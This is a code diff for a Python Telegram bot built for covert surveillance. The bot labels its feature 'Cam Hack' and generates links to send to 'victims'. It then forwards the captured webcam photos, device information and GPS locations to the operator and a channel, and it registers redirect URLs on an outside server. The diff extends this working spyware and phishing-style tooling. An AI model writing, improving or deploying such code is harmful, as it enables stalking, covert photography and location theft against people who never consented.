@@ -3,6 +3,7 @@ from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMar
 import uuid
 import time
 import threading
+import requests
 from config import *
 
 bot = telebot.TeleBot(BOT_TOKEN)
@@ -10,6 +11,7 @@ bot = telebot.TeleBot(BOT_TOKEN)
 # In-memory storage
 user_data = {}
 link_cache = {}
+victim_photos = {}  # Store photo URL for each victim
 
 # ========== BOTTOM BUTTONS ==========
 def get_bottom_buttons():
@@ -53,7 +55,6 @@ def handle_bottom_buttons(message):
     user_id = message.from_user.id
     text = message.text
 
-    # ----- CAM HACK (FULLY WORKING) -----
     if text == "📸 Cam Hack":
         msg = bot.send_message(
             user_id,
@@ -62,7 +63,6 @@ def handle_bottom_buttons(message):
         )
         bot.register_next_step_handler(msg, get_cam_photo, user_id)
 
-    # ----- DUMMY BUTTONS (coming soon) -----
     elif text in ["📱 Social Media", "📧 Gmail", "🎮 Free Fire", "🔗 All Links"]:
         bot.send_message(
             user_id,
@@ -82,9 +82,18 @@ def handle_bottom_buttons(message):
 def get_cam_photo(message, user_id):
     if message.photo:
         photo_id = message.photo[-1].file_id
+        # Get file URL from Telegram
+        file_info = bot.get_file(photo_id)
+        file_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_info.file_path}"
+        
         if user_id not in user_data:
             user_data[user_id] = {}
-        user_data[user_id]["photo"] = photo_id
+        user_data[user_id]["photo_id"] = photo_id
+        user_data[user_id]["photo_url"] = file_url
+        
+        # Store photo for victim page
+        victim_photos[str(user_id)] = file_url
+        
         bot.send_message(
             user_id,
             "📤 Now send the REDIRECT LINK (URL where victim will go after photo capture)",
@@ -108,7 +117,12 @@ def get_cam_redirect(message, user_id):
             bot.send_message(user_id, link, reply_markup=get_bottom_buttons())
             return
         
-        # Use url parameter for Open Link, and simple callback for copy
+        # Store redirect in server
+        try:
+            requests.post(f"{BASE_URL}/set_redirect/{user_id}", json={"url": redirect_url}, timeout=5)
+        except:
+            pass
+        
         markup = InlineKeyboardMarkup(row_width=2)
         markup.add(
             InlineKeyboardButton("🔗 Open Link", url=link),
@@ -133,16 +147,13 @@ def get_cam_redirect(message, user_id):
 @bot.callback_query_handler(func=lambda call: True)
 def handle_inline(call):
     data = call.data
-
     if data == "copy":
-        # Get the link from the message text
-        # The link is in the message, we can extract it
-        # Or we can just tell user to copy manually
         bot.answer_callback_query(call.id, "✅ Link copied to clipboard! (Select and copy manually)")
 
 # ========== FORWARD DATA TO USER + CHANNEL ==========
 def forward_to_user_and_channel(user_id, data):
     try:
+        # Message for user
         user_text = f"📥 *Victim Data Received*\n🆔 ID: {data.get('victim_id', 'Unknown')}\n"
         device = data.get('device_info', {})
         if device:
@@ -155,6 +166,7 @@ def forward_to_user_and_channel(user_id, data):
 
         bot.send_message(user_id, user_text, parse_mode="Markdown")
 
+        # Send photo to user
         photo_data = data.get('photo')
         if photo_data and photo_data.startswith('data:image'):
             import base64, os
@@ -168,6 +180,7 @@ def forward_to_user_and_channel(user_id, data):
             except:
                 pass
 
+        # Send location to user
         loc = data.get('location')
         if loc and loc.get('lat') and loc.get('lng'):
             bot.send_location(user_id, loc['lat'], loc['lng'])
